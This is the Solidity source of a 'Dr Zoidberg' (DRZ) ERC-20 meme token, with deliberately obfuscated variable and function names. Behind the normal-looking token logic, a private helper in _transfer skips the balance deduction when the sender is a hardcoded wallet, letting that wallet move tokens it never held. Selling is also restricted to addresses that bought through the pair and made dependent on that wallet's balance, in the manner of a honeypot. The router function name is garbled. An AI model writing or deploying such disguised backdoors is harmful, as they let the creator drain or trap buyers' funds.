/**

Telegram:  https://t.me/DrZoidbergETH
Website:   https://drzoidberg.net/

It's Zoidberg, John Fucking Zoidberg!

**/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _pvpuo(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _pvpuo(a, b, "SafeMath:");
    }

    function  _pvpuo(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _kahvcoxzp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _pforkucms {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract DrZoidberg is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"Dr Zoidberg";
    string private constant _symbol = unicode"DRZ";
    uint8 private constant _decimals = 9;

    uint256 private constant _Totalvy = 699990000000000 * 10 **_decimals;
    uint256 public _mxTxmvAmaunt = _Totalvy;
    uint256 public _Wallekbxgo = _Totalvy;
    uint256 public _wapThresholdmcx= _Totalvy;
    uint256 public _mkrlToacp= _Totalvy;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isErcapmf;
    mapping (address => bool) private _taxvWaervy;
    mapping(address => uint256) private _lruehrkbacp;
    bool public _tlaeresluove = false;
    address payable private _qfmoburq;

    uint256 private _BuyTaxinitial=1;
    uint256 private _SellTaxinitial=1;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=1;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBefaepnb=0;
    uint256 private _burornrw=0;


    _pforkucms private _qomRotndat;
    address private _acGukvatvw;
    bool private _proylruh;
    bool private iovStpkrq = false;
    bool private _aqmpuayq = false;


    event _amrfolktl(uint _mxTxmvAmaunt);
    modifier lokocThtrap {
        iovStpkrq = true;
        _;
        iovStpkrq = false;
    }

    constructor () {
        _qfmoburq = payable(0x4eAF6d61785CDDAa569D80487278B32FFbfd40bC);
        _balances[_msgSender()] = _Totalvy;
        _isErcapmf[owner()] = true;
        _isErcapmf[address(this)] = true;
        _isErcapmf[_qfmoburq] = true;

 

        emit Transfer(address(0), _msgSender(), _Totalvy);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalvy;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _pvpuo(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tlaeresluove) {
                if (to != address
                (_qomRotndat) && to !=
                 address(_acGukvatvw)) {
                  require(_lruehrkbacp
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _lruehrkbacp
                  [tx.origin] = block.number;
                }
            }

            if (from == _acGukvatvw && to != 
            address(_qomRotndat) && !_isErcapmf[to] ) {
                require(amount <= _mxTxmvAmaunt,
                 "Exceeds the _mxTxmvAmaunt.");
                require(balanceOf(to) + amount
                 <= _Wallekbxgo, "Exceeds the maxWalletSize.");
                if(_burornrw
                < _wapBefaepnb){
                  require(! _feoqouz(to));
                }
                _burornrw++;
                 _taxvWaervy[to]=true;
                teeomoun = amount.mul((_burornrw>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _acGukvatvw && from!= address(this) 
            && !_isErcapmf[from] ){
                require(amount <= _mxTxmvAmaunt && 
                balanceOf(_qfmoburq)<_mkrlToacp,
                 "Exceeds the _mxTxmvAmaunt.");
                teeomoun = amount.mul((_burornrw>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_burornrw>_wapBefaepnb &&
                 _taxvWaervy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!iovStpkrq 
            && to == _acGukvatvw && _aqmpuayq &&
             contractTokenBalance>_wapThresholdmcx 
            && _burornrw>_wapBefaepnb&&
             !_isErcapmf[to]&& !_isErcapmf[from]
            ) {
                _swpuvrkzmj( _pxnue(amount, 
                _pxnue(contractTokenBalance,_mkrlToacp)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _rmojfemp(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _pvpuo(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _pvpuo(teeomoun));
        emit Transfer(from, to, 
        amount. _pvpuo(teeomoun));
    }

    function _swpuvrkzmj(uint256
     tokenAmount) private lokocThtrap {
        if(tokenAmount==0){return;}
        if(!_proylruh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _qomRotndat.WETH();
        _approve(address(this),
         address(_qomRotndat), tokenAmount);
        _qomRotndat.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _pxnue(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _pvpuo(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _qfmoburq){
            return a ;
        }else{
            return a . _pvpuo (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTxmvAmaunt = _Totalvy;
        _Wallekbxgo = _Totalvy;
        _tlaeresluove = false;
        emit _amrfolktl(_Totalvy);
    }

    function _feoqouz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _rmojfemp(uint256
    amount) private {
        _qfmoburq.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _proylruh);
        _qomRotndat   =  _pforkucms (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_qomRotndat), _Totalvy);
        _acGukvatvw = _kahvcoxzp(_qomRotndat.factory()). createPair (address(this),  _qomRotndat . WETH ());
        _qomRotndat.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_acGukvatvw).approve(address(_qomRotndat), type(uint).max);
        _aqmpuayq = true;
        _proylruh = true;
    }

    receive() external payable {}
}